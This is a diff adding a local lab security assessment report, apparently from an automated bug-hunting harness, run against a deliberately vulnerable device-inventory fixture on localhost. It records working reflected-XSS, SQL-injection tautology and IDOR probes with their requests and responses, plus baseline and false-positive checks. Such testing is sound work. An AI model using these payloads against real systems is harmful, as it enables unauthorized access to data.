@@ -1,0 +1,123 @@
+==============================================================================
+Claude-BugHunter Local Lab Security Assessment & Verification Report
+==============================================================================
+Timestamp (UTC): 2026-11-22T15:55:35Z
+Target Base URL: http://127.0.0.1:8765
+Fixture Mode:    vulnerable
+Fixture Patches: {"idor": false, "sqli": false, "xss": false}
+Summary:         total=8 passed=8 failed=0 tp_confirmed=3 patched_verified=0 fp_confirmed=1
+
+--- Security Headers Check (GET /) ---
+Status:  200
+Present: {}
+Missing: Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Strict-Transport-Security
+Note:    Per triage-validation skill, missing security headers alone are Informational/Low unless chained to a concrete exploit.
+
+------------------------------------------------------------------------------
+[BASE-001] Health check endpoint | skill=bb-methodology | verdict=BASELINE_PASS | pass=True
+Request:  GET http://127.0.0.1:8765/health
+Response: HTTP 200 (application/json, 86 bytes)
+  [OK] status_code: expected=200 observed=200
+  [OK] body_contains: expected=ok observed=True
+Body Preview:
+{"mode":"vulnerable","patches":{"idor":false,"sqli":false,"xss":false},"status":"ok"}
+
+
+------------------------------------------------------------------------------
+[BASE-002] Benign device lookup by hostname | skill=bb-methodology | verdict=BASELINE_PASS | pass=True
+Request:  GET http://127.0.0.1:8765/api/devices?hostname=core-rtr-01.lab.internal
+Response: HTTP 200 (application/json, 210 bytes)
+  [OK] status_code: expected=200 observed=200
+  [OK] body_contains: expected=192.0.2.10 observed=True
+  [OK] expected_device_count: expected=1 observed=1
+Body Preview:
+{"count":1,"devices":[{"hostname":"core-rtr-01.lab.internal","id":1,"ip_address":"192.0.2.10","os_version":"LabIOS-XE 17.9","owner":"alice.netops","role":"core-router","site":"dc-west-lab","status":"online"}]}
+
+
+------------------------------------------------------------------------------
+[BASE-003] Benign search query | skill=bb-methodology | verdict=BASELINE_PASS | pass=True
+Request:  GET http://127.0.0.1:8765/search?q=core-rtr-01
+Response: HTTP 200 (text/html; charset=utf-8, 2968 bytes)
+  [OK] status_code: expected=200 observed=200
+  [OK] content_type_contains: expected=text/html observed=text/html; charset=utf-8
+  [OK] body_contains: expected=core-rtr-01 observed=True
+Body Preview:
+<main>
+    <div class="card">
+      <h2>Results for: core-rtr-01</h2>
+      <table>
+        <thead>
+          <tr><th>ID</th><th>Hostname</th><th>IP Address</th><th>Role</th><th>Site</th><th>Status</th></tr>
+        </thead>
+        <tbody><tr><td>1</td><td><code>core-rtr-01.lab.internal</code></td><td>192.0.2.10</td><td>core-router</td><td>dc-west-lab</td><td>online</td></tr></tbody>
+      </table>
+    </div>
+  </main>
+</body>
+</html>
+
+------------------------------------------------------------------------------
+[BASE-004] Authorized owner ticket lookup | skill=bb-methodology | verdict=BASELINE_PASS | pass=True
+Request:  GET http://127.0.0.1:8765/api/tickets/101
+Headers:  {"X-Lab-User": "alice.netops"}
+Response: HTTP 200 (application/json, 367 bytes)
+  [OK] status_code: expected=200 observed=200
+  [OK] body_contains: expected=LAB-TICKET-NOTE-ONLY-192-0-2-10 observed=True
+Body Preview:
+{"device_hostname":"core-rtr-01.lab.internal","id":101,"internal_note":"LAB-TICKET-NOTE-ONLY-192-0-2-10: Peer AS 65001 test window approved for Saturday 02:00 UTC.","owner":"alice.netops","priority":"high","status":"open","summary":"Verify BGP hold and graceful restart timers ahead of weekend maintenance.","title":"BGP graceful restart timer audit on core-rtr-01"}
+
+
+------------------------------------------------------------------------------
+[XSS-001] Reflected XSS probe on /search | skill=hunt-xss | verdict=TP_CONFIRMED | pass=True
+Request:  GET http://127.0.0.1:8765/search?q=%3Cscript%3Ealert%28%27LAB-XSS-PROOF%27%29%3C%2Fscript%3E
+Response: HTTP 200 (text/html; charset=utf-8, 2926 bytes)
+  [OK] status_code: expected=200 observed=200
+  [OK] content_type_contains: expected=text/html observed=text/html; charset=utf-8
+  [OK] unescaped_marker: expected=<script>alert('LAB-XSS-PROOF')</script> observed=True
+Body Preview:
+<main>
+    <div class="card">
+      <h2>Results for: <script>alert('LAB-XSS-PROOF')</script></h2>
+      <table>
+        <thead>
+          <tr><th>ID</th><th>Hostname</th><th>IP Address</th><th>Role</th><th>Site</th><th>Status</th></tr>
+        </thead>
+        <tbody><tr><td colspan='6' class='meta'>No matching devices found.</td></tr></tbody>
+      </table>
+    </div>
+  </main>
+</body>
+</html>
+
+------------------------------------------------------------------------------
+[SQLI-001] Boolean-tautology SQL injection probe on /api/devices | skill=hunt-sqli | verdict=TP_CONFIRMED | pass=True
+Request:  GET http://127.0.0.1:8765/api/devices?hostname=%27+OR+%271%27%3D%271
+Response: HTTP 200 (application/json, 1161 bytes)
+  [OK] status_code: expected=200 observed=200
+  [OK] body_contains: expected=mgmt-jump-06.lab.internal observed=True
+  [OK] min_device_count: expected=>=6 observed=6
+Body Preview:
+{"count":6,"devices":[{"hostname":"core-rtr-01.lab.internal","id":1,"ip_address":"192.0.2.10","os_version":"LabIOS-XE 17.9","owner":"alice.netops","role":"core-router","site":"dc-west-lab","status":"online"},{"hostname":"dist-sw-02.lab.internal","id":2,"ip_address":"192.0.2.20","os_version":"LabNX-OS 10.3","owner":"alice.netops","role":"distribution-switch","site":"dc-west-lab","status":"online"},{"hostname":"edge-fw-03.lab.internal","id":3,"ip_address":"198.51.100.1","os_version":"LabPAN-OS 11.1","owner":"bob.secops","role":"edge-firewall","site":"dc-east-lab","status":"online"},{"hostname":"wan-gw-04.lab.internal","id":4,"ip_address":"203.0.113.1","os_version":"LabJunOS 23.4","owner":"alice.netops","role":"wan-gateway","site":"dc-east-lab","status":"maintenance"},{"hostname":"access-sw-05.lab.internal","id":5,"ip_address":"198.51.100.25","os_version":"LabEOS 4.31","owner":"carol.noc","role":"access-switch","site":"branch-north-lab","status":"online"},{"hostname":"mgmt-jump-06.lab.internal","id":6,"ip_address":"203.0.113.50","os_version":"LabLinux 6.8","owner":"bob.secops","role":"management-bastion","site":"dc-west-lab","status":"online"}]}
+
+
+------------------------------------------------------------------------------
+[IDOR-001] Horizontal IDOR probe reading another user's ticket | skill=hunt-idor | verdict=TP_CONFIRMED | pass=True
+Request:  GET http://127.0.0.1:8765/api/tickets/102
+Headers:  {"X-Lab-User": "carol.noc"}
+Response: HTTP 200 (application/json, 348 bytes)
+  [OK] status_code: expected=200 observed=200
+  [OK] body_contains: expected=LAB-TICKET-NOTE-ONLY-198-51-100-42 observed=True
+Body Preview:
+{"device_hostname":"edge-fw-03.lab.internal","id":102,"internal_note":"LAB-TICKET-NOTE-ONLY-198-51-100-42: SecOps internal review marker for IDOR verification.","owner":"bob.secops","priority":"high","status":"in_progress","summary":"Audit lab egress policy and remove stale RFC 5737 test entries.","title":"Review egress ACL rules on edge-fw-03"}
+
+
+------------------------------------------------------------------------------
+[FP-001] Benign JSON status endpoint with HTML-like query input | skill=triage-validation | verdict=FP_CONFIRMED | pass=True
+Request:  GET http://127.0.0.1:8765/api/status?check=%3Cscript%3Ealert%28%27FP-CHECK%27%29%3C%2Fscript%3E
+Response: HTTP 200 (application/json, 195 bytes)
+  [OK] status_code: expected=200 observed=200
+  [OK] content_type_contains: expected=application/json observed=application/json
+  [OK] not_executable_html: expected=application/json (non-HTML) observed=Content-Type=application/json; X-Content-Type-Options=nosniff
+Body Preview:
+{"echo_check":"<script>alert('FP-CHECK')</script>","mode":"vulnerable","note":"Benign JSON diagnostic endpoint; served strictly as application/json.","service":"netops-portal-lab","status":"ok"}
+
